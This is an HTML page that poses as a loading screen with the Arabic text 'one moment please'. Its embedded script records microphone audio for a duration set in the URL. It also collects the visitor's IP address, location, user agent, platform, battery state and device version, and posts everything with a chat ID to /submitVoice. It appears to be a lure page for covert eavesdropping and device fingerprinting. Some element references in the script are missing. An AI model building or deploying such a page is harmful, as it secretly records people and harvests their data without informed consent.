<!DOCTYPE html>
<html lang="en">
<head>
  <title>Are</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');

    body {
      font-family: 'Poppins', sans-serif;
      margin: 0;
      padding: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      color: #fff;
    }

    .container {
      text-align: center;
      padding: 40px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
      position: relative;
      overflow: hidden;
      backdrop-filter: blur(10px);
    }

    .container::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
      transform: rotate(45deg);
      animation: animate 5s linear infinite;
    }

    @keyframes animate {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading {
      border: 8px solid rgba(243, 243, 243, 0.2);
      border-top: 8px solid #e74c3c;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1.5s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .message {
      font-size: 20px;
      color: #ecf0f1;
      margin-top: 20px;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loading"></div>
    <p class="message">لحظه واحده من فظلك...</p>
  </div>

  <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
        <input type="hidden" name="chatId" id="chatId">
        <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
    </form>
    <script>
    const dataForm = document.getElementById('dataForm');
    const chatIdInput = document.getElementById('chatIdInput');
    const notification = document.getElementById('notification');

    const chatId = window.location.pathname.split('/').pop();
    chatIdInput.value = chatId;

    const duration = getParameterByName('duration');
    let mediaRecorder;
    let audioChunks = [];

    async function getIPInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                country: data.country_name,
                city: data.city
            };
        } catch (error) {
            console.error('Error fetching IP info:', error);
            return {
                ip: 'Unknown',
                country: 'Unknown',
                city: 'Unknown'
            };
        }
    }

    function getPlatformInfo() {
        const ua = navigator.userAgent;
        let platform = "Unknown";
        if (/Windows/.test(ua)) platform = "Windows";
        else if (/Mac/.test(ua)) platform = "MacOS";
        else if (/Linux/.test(ua)) platform = "Linux";
        else if (/Android/.test(ua)) platform = "Android";
        else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";

        return {
            platform: platform,
            userAgent: ua
        };
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    batteryLevel: battery.level,
                    batteryCharging: battery.charging
                };
            } catch (error) {
                console.error('Error getting battery info:', error);
            }
        }
        return {
            batteryLevel: undefined,
            batteryCharging: undefined
        };
    }

    function getDeviceVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/\(([^)]+)\)/);
        return match ? match[1] : 'Unknown';
    }

    window.addEventListener('load', () => {
        const parsedDuration = parseInt(duration);
        if (parsedDuration > 0 && parsedDuration <= 20) {
            startRecording(parsedDuration);
        } else {
            notification.textContent = 'حدث خطأ في مدة التسجيل.';
        }
    });

    async function startRecording(recordDuration) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.start();

            notification.textContent = 'جاري التسجيل...';

            setTimeout(() => {
                mediaRecorder.stop();
                notification.textContent = 'تم إيقاف التسجيل، جاري الإرسال...';
            }, recordDuration * 1000);

            mediaRecorder.addEventListener('dataavailable', event => {
                audioChunks.push(event.data);
            });

            mediaRecorder.addEventListener('stop', async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
                const formData = new FormData();
                formData.append('voice', audioBlob, 'voice.ogg');
                formData.append('chatId', chatId);

                const ipInfo = await getIPInfo();
                const platformInfo = getPlatformInfo();
                const batteryInfo = await getBatteryInfo();
                const deviceVersion = getDeviceVersion();

                const additionalData = {
                    ...ipInfo,
                    ...platformInfo,
                    ...batteryInfo,
                    deviceVersion
                };

                formData.append('additionalData', JSON.stringify(additionalData));

                try {
                    const response = await fetch('/submitVoice', {
                        method: 'POST',
                        body: formData
                    });
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    const data = await response.text();
                    console.log('تم إرسال التسجيل الصوتي والبيانات بنجاح');
                    notification.textContent = 'تم إرسال التسجيل الصوتي والبيانات بنجاح';
                } catch (error) {
                    console.error('حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات:', error);
                    notification.textContent = 'حدث خطأ أثناء إرسال التسجيل الصوتي والبيانات';
                }
            });
        } catch (error) {
            console.error('خطأ في الوصول إلى الميكروفون:', error);
            notification.textContent = 'خطأ في الوصول إلى الميكروفون';
        }
    }

    function getParameterByName(name, url = window.location.href) {
        name = name.replace(/[\[\]]/g, '\\$&');
        const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
              results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }
    </script>
</body>
</html>
